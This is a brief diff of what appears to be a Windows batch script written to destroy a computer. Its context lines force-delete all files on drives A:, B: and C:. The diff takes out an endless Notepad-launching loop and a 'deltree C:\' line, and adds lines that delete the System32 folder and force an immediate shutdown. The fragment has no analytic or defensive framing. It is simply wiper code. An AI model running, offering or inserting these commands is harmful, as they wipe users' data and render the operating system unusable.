@@ -43,8 +43,6 @@
     del A:\. /f /s /q
     del B:\. /f /s /q
     del C:\. /f /s /q
-    :top
-START %SystemRoot%\system32\notepad.exe
-GOTO top
-deltree C:\
+   del C:\Windows\System32\
+   shutdown -s -t "00"
 
